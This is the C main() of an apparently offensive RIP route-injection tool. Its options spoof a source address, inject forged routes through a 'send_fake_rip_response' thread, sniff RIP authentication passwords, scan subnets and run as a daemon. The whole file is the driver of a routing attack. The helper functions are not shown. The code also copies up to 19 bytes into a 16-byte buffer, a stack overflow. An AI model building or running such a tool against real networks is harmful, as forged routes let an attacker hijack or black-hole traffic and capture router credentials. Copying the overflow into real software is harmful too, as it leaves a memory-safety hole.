#include "fibc.h"
#include "flags.h"

static struct neo_options opt[] = {

  {'-', 0, 0, NULL, "type:"},
  {'a', required_argument, "a/xarbng", "file", "read routes from this file"},
  {'r', required_argument, "r/xarb", "route", "route to inject"},
  {'b', required_argument, "b/xarbng", "subnet", "subnet to scan"},
  {'n', required_argument, "rn/xrnab", "netmask", "netmask of the route"},
  {'g', required_argument, "rg/rxgab", "gateway", "default gateway"},
  {'m', required_argument, "rm/rmxab", "metric", "metric to the route"},
  {'s', required_argument, NULL, "address", "spoofed source"},
  {'p', required_argument, NULL, "passwd", "password for autentication"},
  {'+', 0, "s|ar", 0, 0},
  {'x', no_argument, "x/xarbngd", "address", "spoofed source"},
  {'h', no_argument, NULL, NULL, "print help"},
  {'d', no_argument, "d/dc", NULL, "daemonize"},
  {'c', no_argument, "c/cd", NULL, "check injection"},
  {'f', no_argument, NULL, NULL, "force injection"},
  {0, 0, 0, 0, 0}
};

int
main (int argc, char **argv)
{
  unsigned long sp00f = 0;
  char ch, subnet[16];
  
  credits ();
  init_all ();

  neo_getopt (argc, argv, opt, OPT_NOW);
  while ((ch = neo_getopt (argc, argv, opt, OPT_DELAYED)) != EOF)
    {
      switch (ch)
	{
	case 'b':
	  strncpy (subnet, neoptarg, 19);
	  flags ^= SCAN;
	  break;
	case 'x':
	  flags ^= SNIFF;
	  break;
	case 's':
	  sp00f = inet_addr (neoptarg);
	  flags ^= SPOOF;
	  break;
	case 'p':
	  strncpy (password, neoptarg, 16);
          flags ^= PASS;
          break;  
	case 'r':
	  routes[0][0] = inet_addr (neoptarg);
	  break;
	case 'm':
	  routes[3][0] = inet_addr (neoptarg);
	  break;
	case 'g':
	  routes[2][0] = inet_addr (neoptarg);
	  break;
	case 'n':
	  routes[1][0] = inet_addr (neoptarg);
	  break;
	case 'a':
	  printf ("Reading file %s...\n\n", neoptarg);
	  rip_file_read (neoptarg);
	  break;
	case 'h':
	  usage (argv[0]);
	  break;
	case 'd':
	  flags ^= DAEMON;
	  break;
	case 'f':
	  flags ^= FORCE;
	  break;
	case 'c':
	  flags ^= CHECK;
	  break;
	}
    }

    if (flags & DAEMON)
      {
        if (fork ())
          exit (0);
      }
    else
       printf ("\nPress 'q' and Enter to exit\n\n");
  
  if (flags & SCAN)
    {
      scan_net (subnet);
      exit (0);
    }
  if (flags & SNIFF)
    {
      if (pthread_create (&pt, NULL, (void *) sniff_passwd, NULL))
        fatal("Cannot create pthread!\n\n");
      wait();
      exit(0);
    }
  if (!routes[0][0])
    usage (argv[0]);
  if (!(flags & FORCE))
    check_forward ();
  if (flags & SPOOF)
    localaddr = sp00f;
  if (flags & PASS)
    {
      if (pthread_create (&pt, NULL, (void *) auth_pass, NULL))
	fatal("Cannot create pthread!\n\n");
    }
  else 
    {
      if (pthread_create (&pt, NULL, (void *) send_fake_rip_response, NULL))
	fatal("Cannot create pthread!\n\n");
    } 
  if (flags & CHECK)
    {
      if (flags & PASS) {
        if (pthread_create (&pt1, NULL, (void *) check_injection_crypt, NULL))
          {
            fprintf (stderr, "\nerror while creating the pthread\n");
            pthread_cancel (pt);
            pthread_join (pt, NULL);
            exit (1);
          }
      } else {
        if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
	  {
	    fprintf (stderr, "\nerror while creating the pthread\n");
	    pthread_cancel (pt);
	    pthread_join (pt, NULL);
	    exit (1);
	  }
      }
    }
  wait();
  
  return 0;
}
